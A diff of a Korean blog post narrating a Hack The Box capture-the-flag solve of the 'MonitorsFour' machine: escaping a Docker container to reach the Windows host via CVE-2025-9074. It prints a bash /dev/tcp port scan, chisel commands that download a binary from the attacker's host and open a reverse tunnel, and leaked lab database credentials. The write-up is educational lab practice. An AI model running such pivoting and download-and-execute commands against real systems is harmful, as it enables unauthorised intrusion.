@@ -4,8 +4,10 @@ date: 2025-12-17 19:25:43 +09:00
 categories: [hacking, saturnx operators, Windows]
 tags: [Hack The Box]
 pin: true
-password: "password"
+password: "202512202248"
 ---
+
+![MonitorsFour clear](https://github.com/user-attachments/assets/a679d8fe-6b3d-4a83-a68a-04a20a52c704)
 
 ## 시작에 앞서
 
@@ -274,4 +276,294 @@ Others 권한이 `r-x` 즉 읽기, 실행으로 설정되어있었다.
 
 ## 권한 상승 (Privilege Escalation) 
 
+![winrm](https://github.com/user-attachments/assets/63c49e0a-b9bb-44ee-9228-6700628e63e4)
+
+다시 돌아와서 저번에 얻었던 `marcus/wonderful1`을 5985번 포트에 열려있던 winrm을 통해 접속을 시도하니 성공했다.
+
+![what](https://github.com/user-attachments/assets/efe56a41-beac-4bc7-bc4a-ab731b6da72a)
+
+음? 보아하니 marcus는 winrm을 사용할 수 없는 걸수도? (요건 다른 윈도우 계정 문제 보고 오면 이해 하실 수 있습니다!)
+
+![docker](https://github.com/user-attachments/assets/7a8a8844-6e23-4f14-affa-31137e9ff1e7)
+
+그리고 이후에 어떻게 해야할까 제미나이와 이야기를 하다보니 지금 이 리버스 쉘이 도커 환경안에 있다는 이야기를 하여 `/` 디랙토리를 리스팅 해보니 역시 `.dockerenv`가 있는 것을 알 수 있었다!
+
+그니까 외부에서 스캔(`nmap`)해 보았을 땐 `OS: Windows`에 `5985(WinRM)` 포트가 열려있었기에 HOST는 Windows가 맞으나 리버스쉘로 연결되었을 때에는 `ls, bash, /home` 등이 가능하다는 것으로 미루어보아 `Linux` 환경이가는 것을 알 수 있다.
+
+고로 여기서 우린 지금 `WSL(Windows Subsystem for Linux)`로 돌아가고 있거나 `Docker` 환경임을 짐작할 수 있고 `.dockerenv` 파일을 통해 Docker라고 확정 지을 수 있는 것!!!
+
+그리고 애초에 `Cacti(웹 서비스)`를 돌리고 있으니 도커라고 볼 수 있다.
+
+![why not](https://github.com/user-attachments/assets/cecfaad7-70f6-4a2c-a6da-6f92a036cf19)
+
+인공지능은 답을 찾는데 도움을 줄 뿐 이해는 내가 해야하는 것!
+
+그러면 이제 이 도커 환경을 탈출할 방법을 찾아야겠지?
+
+![윈도우 환경 도커 탈출](https://github.com/user-attachments/assets/6fdcef18-a672-4eef-946e-0b49914edd76)
+
+[도커 데스크톱 치명적 보안취약점, 윈도우 호스트 장악 가능…긴급 업데이트 필요](https://www.dailysecu.com/news/articleView.html?idxno=169074)
+
+아니 이게 있네?
+
+그리고 이제 이걸 어떻게 써야하나 제미나이와 이야기를 해보니 내부망이 어떻게 되어있나 확인을 해보자고 한다.
+
+![네트워크 확인](https://github.com/user-attachments/assets/3b510396-4c43-463c-93de-6114c1f70145)
+
+위 `ip route show` 를 통해 호스트(Windows)의 내부 IP 가 `172.18.0.1`이라는 것을 확인할 수 있었다. 그리고 도커 네트워크의 게이트웨이가 호스트라고 한다.
+
+근데 이제 좀 더 자세히 알아보기에 앞서 네트워크 스캔을 위한 `nmap`이 없으니 이걸 bash를 이용해서 구현할 수 있다고 한다.
+
+```bash
+for port in 21 22 23 25 53 80 88 135 139 389 443 445 593 636 1433 2375 2376 3306 3389 5985 5986 8080 8443; do timeout 1 bash -c "echo >/dev/tcp/172.18.0.1/$port" 2>/dev/null && echo "Port $port is open"; done
+```
+
+![scan](https://github.com/user-attachments/assets/8f3ce97a-0ccb-4b4f-830f-4b34d8a10e3d)
+
+오... 아쉽게도 우리가 찾던 2375 포트는 없고 80번이나 3306번 포트가 열려있음을 확인했다.
+
+뭔가 저 포트 익숙하지 않은가? 바로 저 위에서 찾았던 `.env`파일! 그 안에 들어있는 포트다!
+
+```
+DB_HOST=mariadb
+DB_PORT=3306
+DB_NAME=monitorsfour_db
+DB_USER=monitorsdbuser
+DB_PASS=f37p2j8f4t0r
+```
+
+![dumpshell](https://github.com/user-attachments/assets/c97448b7-b043-4aab-920b-8965509b466b)
+
+확인해보니 mysql도 깔려있고, mariadb에도 접속을 할 수는 있는데...
+
+아니 이거 또 dumpshell 이슈가..
+
+![chisel reverse wrong](https://github.com/user-attachments/assets/2e8a5e54-6081-44ea-a2ba-07b305a29bb6)
+
+아니.. 근데 왜 리버스 쉘이 또또또 멈췄다. 벌써 진행하면서 8번짼데 이거 왜 이러니...
+
+### chisel 터널링
+
+![받는쪽](https://github.com/user-attachments/assets/5f6dcffd-1ef8-4f06-a2d7-9531adb3d166)
+
+![공격하는 쪽](https://github.com/user-attachments/assets/742efcfc-7247-4aa3-bfec-4e8f24220387)
+
+![넘길 때](https://github.com/user-attachments/assets/dffe518b-396f-4127-b345-a352f3c57c2e)
+
+일단 이 작업을 위해선 되게 많은 쉘을 켜야하는데 kali라면 `ctrl + shift + R`을 눌러 쉘을 나눌 수 있다!
+
+> 1번 쉘 (kali 에서 chisel 보낼 때)
+
+```bash
+$ which chisel
+/usr/bin/chisel
+
+$ cp /usr/bin/chisel .
+
+$ ls
+chisel  exploit2.py  exploit.py  README.md  venv
+
+$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.98 - - [19/Dec/2025 09:20:57] "GET /chisel HTTP/1.1" 200 -
+```
+
+> chisel 서버 (kali)
+
+```bash
+$ chisel server -p 8000 --reverse
+2025/12/19 09:14:48 server: Reverse tunnelling enabled
+2025/12/19 09:14:48 server: Fingerprint AcScc6lvQKS8zvAiSTBa6XUhH2nuoO2f1MHdmkW1N48=
+2025/12/19 09:14:48 server: Listening on http://0.0.0.0:8000
+```
+
+> 받는쪽 (피해자)
+
+```bash
+$ curl http://10.10.15.126/chisel -o chisel
+
+$ chmod +x chisel
+
+$ ./chisel client 10.10.15.126:8000 R:3306:172.18.0.1:3306
+<sel client 10.10.15.126:8000 R:3306:172.18.0.1:3306
+2025/12/19 14:21:15 client: Connecting to ws://10.10.15.126:8000
+2025/12/19 14:21:18 client: Connected (Latency 556.394391ms)
+```
+
+참고로 보면 알겠지만 터미널들을 끄면 안된다.
+
+물론 chisel 보낼 때 쓴 터미널만 뺴고.
+
+![all complete](https://github.com/user-attachments/assets/7fd334e2-6638-49a8-88f9-32b6f236a83b)
+
+보아하니 위와 같은 모습이 된다.
+
+더 깔끔하게 쓰려면 tmux를 이용하면 되겠지만 난 이정도여도 만족!
+
+### 다시 문제로 돌아와
+
+![mariadb](https://github.com/user-attachments/assets/91743870-c43d-477d-a5ce-4952427f7294)
+
+보다싶이 드디어! dumpshell을 벗어나 kali에서 쉘을 열어 mariaDB를 이요할 수 있게 되었다!
+
+![database](https://github.com/user-attachments/assets/22efdd43-a9ac-496f-8f96-8fbae6e94c82)
+
+딱 보니 monitorsfour_db가 우리가 찾는거겠지?
+
+![users](https://github.com/user-attachments/assets/61e08541-55d0-4a03-8b7d-13ca9eb0cca7)
+
+엑.. 근데 보아하니 password가 암호화 되어있다.
+
+아니 그리고 저거 이미 찾은거 아닌가? 맞잖아? admin 해시 풀어보면 `wonderful1`나오는거니까... 수미상관?
+
+![customers](https://github.com/user-attachments/assets/be05d85c-36ab-47f2-b884-686c896e9680)
+
+난 나쁜 해커가 아니니까 의미 없고
+
+![changelog](https://github.com/user-attachments/assets/f3b52515-e9e6-4417-95f4-7cab96aa8cd2)
+
+changelog도 원래 웹에서 볼 수 있는 내용이고...
+
+![dashboard](https://github.com/user-attachments/assets/3db0a1bc-b997-4fa0-9450-97e2b651c119)
+
+역시다.. 이러면 굳이 더이상 이 mariadb를 볼 필요가 없어지는데...
+
+![리셋 한번](https://github.com/user-attachments/assets/8a3ebd7c-6e5d-40c3-a449-5b1f8dc7ad6e)
+
+한번 리셋을 진행했다.
+
+### 다음날
+
+어제와 동일하게 저 CVE는 쓸 수가 없으니 내가 혹시 빼먹은 것이 있지 않을까 하여 좀 더 둘러보기로 했다.
+
+![mount](https://github.com/user-attachments/assets/33cc5e5e-ec5e-4dfd-a883-3f38b84088fa)
+
+일단 마운팅된 정보는 위와 같고...
+
+![네트워크](https://github.com/user-attachments/assets/493fa675-ff93-470d-a9e6-13d14289c1c0)
+
+네트워크 정보는 다를거 없고
+
+근데 보아하니 `df -h` 결과를 통해 윈도우 C 드라이브가 마운팅이 안되어있는 것을 확실히 알 수 있었다.
+
+그리고 그럼 내가 더이상 할 수 있는게 뭘까 했는데 gemini가 말하길
+
+![api 80](https://github.com/user-attachments/assets/5375dcf0-9034-4260-8cab-793220c58e18)
+
+80번 포트가 열려 윈도우와 통신하고 있으니 이 열린 포트를 통해 RCE를 실행시키자고 한다.
+
+![scan](https://github.com/user-attachments/assets/a9d64db4-8e7a-4c70-83c4-17e7203dafff)
+
+```shell
+for word in users admin status version command upload shell run configure system logs backup; do
+  echo -n "Testing /api/v1/$word ... "
+  curl -s -o /dev/null -w "%{http_code}" -H "Host: monitorsfour.htb" -H "Authorization: Bearer 663bdc7a236f81638d" http://172.18.0.1/api/v1/$word
+  echo ""
+done
+```
+
+간단한 명령어를 만들어 API에 쓰이는 주소를 싹 스캔해보니 `/api/v1/users` 가 200이 뜨는걸 확인할 수 있었다!
+
+근데 이거 그냥 monitorsfour 웹 사이트잖아? 의미가 없는데...
+
+![index.php](https://github.com/user-attachments/assets/70d6422b-a839-4e40-a3c1-737673ca8a8e)
+
+일단 `/app/index.php`를 통해 api 리스트는 얻었다. 만.. 다 확인해봐도 딱히...?
+
+![외부 서버 ip가 다른데?](https://github.com/user-attachments/assets/7ed7793c-9959-47b7-aa8d-2e08c93192cd)
+
+어... 아니... 그 이 도커에서 연결된 ip를 찾아보려고 좀 더 찾아보다가.. 아니 잠만 뭔가 잘못 생각한거 같은데? gemini형? 이거 아니잖아요?
+
+- 172.18.0.3 : Cacti 컨테이너
+- 172.18.0.2 : MariaDB 컨테이너
+- 172.18.0.1 : 게이트웨이
+- 127.0.0.11 : 도커 DNS
+- 192.168.65.7 : 넌 누구니?
+
+[[Docker] 도커 네트워크 / by @seungwook_TIL](https://rebugs.tistory.com/752)
+
+![docker](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdna%2FFefOI%2FbtsJt5xbBYs%2FAAAAAAAAAAAAAAAAAAAAAFWuk4HpTTmQpJvhNsCAOaeZYd_UxfNxxlSbdBSUCpCs%2Fimg.png%3Fcredential%3DyqXZFxpELC7KVnFOS48ylbz2pIh7yKj8%26expires%3D1767193199%26allow_ip%3D%26allow_referer%3D%26signature%3DUOr78ktIpBV7JLYLD1pQN4bUS04%253D)
+
+위 블로그의 내용을 참고해보니 저 ip는 외부에서 이 window 머신으로 가는 네트워크와 관련되어 있는 ip인거 같은데...
+
+애초에 `#`으로 되어있으니 의미도 없고.. 인데...?
+
+![192 scan](https://github.com/user-attachments/assets/3ddda220-4979-4be9-a091-c4af3fadc11e)
+
+아니 왜 스캔이 되죠? 아니 애초에 이게 되는게 맞아? 무슨 원리로?
+
+![gemini](https://github.com/user-attachments/assets/cfa7ade4-f018-4eee-b865-76ad8d707701)
+
+일단 제미나이 선생은 이리 말했는데...
+
+밥 먹고 와서 다시 차분히 알아보니 어째 사실상 처음에 CVE에 대해 좀 더 자세하게 들여다봤다면 이미 문제를 풀었을지도 모르겠다는 생각이 든다.
+
+[Windows/macOS Docker Desktop SSRF 취약점 (CVE-2025-9074)](https://ggonmerr.tistory.com/655)
+
+[도커 데스크탑(Docker Desktop) 취약점 보고서: CVE-2025-9074](https://s2w.inc/ko/resource/detail/929)
+
+![기본 엔드포인트](https://github.com/user-attachments/assets/7f6d5956-7196-49d8-aaf0-744ea9565351)
+
+애초에 이 취약점이 발생하는 API 엔드포인트가 `192.168.65.7`이라 했었다.
+
+![about CVE](https://github.com/user-attachments/assets/9e019901-807b-4e6c-95a3-50cd4b3d109f)
+
+아 좀만 더 자세히 차분히 볼껄...
+
+### 그래서 이제 진짜 권한 상승
+
+![/etc/resolv.cof](https://github.com/user-attachments/assets/7ed7793c-9959-47b7-aa8d-2e08c93192cd)
+
+다시 돌아와 우리는 현재 시스템이 Docker Desktop (버전 4.44.2)라는 것을 admin으로 웹에 로그인 했을 때 뿐 아니라 내부 파일들을 둘러보며 확인할 수 있었다.
+
+게다가 그에 따른 취약점 검색을 통해 `CVE-2025-9074`가 존재함을 확인하였고 `/etc/resolv.conf` 파일 내의 Nameserver 주소를 통해 Docker Host(API 엔드포인트)의 IP가 `192.168.65.7` 라는 사실도 확인할 수 있었다.
+
+![portscan](https://github.com/user-attachments/assets/4399c30d-4fbe-4c42-9fcb-512d55e0974e)
+
+그리고 또한 간단한 포트 스캔을 통해 CVE에 활용할 `2375`포트가 열려있음을 확인했다.
+
+### CVE-2025-9074 이용하기
+
+[BridgerAlderson/CVE-2025-9074-PoC](https://github.com/BridgerAlderson/CVE-2025-9074-PoC)을 이용했다.
+
+![root get](https://github.com/user-attachments/assets/2be6c493-9008-4b34-b4db-665f71d7cd9d)
+
+그리고! 성공!
+
+자세히 보면 알 수 있겠지만
+
+![root](https://github.com/user-attachments/assets/2bbbe038-2811-4d52-a52c-4a32971e6eb1)
+
+지금 `@`뒤의 부분이 아까의 `821fbd6a43fa`이 아니라 `34f81571e856` 즉 이번 CVE의 특징인 다른 새로운 컨테이너를 만들어서 그것의 권한을 통해 루트 권한을 획득했음을 알 수 있다.
+
+![root?](https://github.com/user-attachments/assets/55899d7b-630c-4c05-84f2-db1b4ea57ba2)
+
+근데 flag께선 어딜 가셨소?
+
+![why?](https://github.com/user-attachments/assets/7be0fd1e-53b9-4a3e-8beb-9aa6d66140c1)
+
+아니 왜 여기도 없는데?
+
+![why here](https://github.com/user-attachments/assets/0d89d04f-9623-4b05-9c01-dff7fe3d904a)
+
+윈도우 문제는 root 플래그가 `/c/Users/Administrator/Desktop`에 있네? 진짜 이거 찾으려고 내부를 싹 뒤졌다.
+
+일단 `/host_root/mnt`까지는 도커에서 윈도우 드라이브 마운팅 한 부분이고, `/c/Users/Administrator/Desktop`은 이후 C드라이브에서 유저중에 관리자 계정의 바탕화면에 root 플래그가 존재한다. 요건 좀 외워둬야할듯 하다.
+
+![hard](https://github.com/user-attachments/assets/72b80786-8d0f-40f6-9153-913f6dea4be3)
+
+이게 어떻게 Easy야!!! hard나 먹어라!!
+
 ## 마치며
+
+[MonitorsFour has been Pwned!](https://labs.hackthebox.com/achievement/machine/988787/814)
+
+![Pwned](https://github.com/user-attachments/assets/46dda9af-3604-4868-a978-f7959b840275)
+
+와... 솔직히 난 윈도우 문제 하면 또 bloodhound 켜고 계정 연결하고 여기 저기 이동하거나 할줄 알았지 Easy 문제에서 도커 탈출을 시킬줄은...
+
+솔직히 이번 문제에서 삽질을 많이 하게 된 이유가 내가 docker라는 것에 대해서 사실상 문제를 푸는데 있어 필요한 핵심 지식들이 없는 상태에서 진행을 했다보니 이번처럼 삽질을 많이 하게 된 듯 하다.
+
+어째 문제 풀 때마다 배우는게 계속 늘어나네? 뭔가 재밌기도 하고 머리아프기도 하고.
+
+일단은 문제 푸는데에 집중을 했다보니 발표자료 만들면서 다시 좀 더 정리해야겠다!
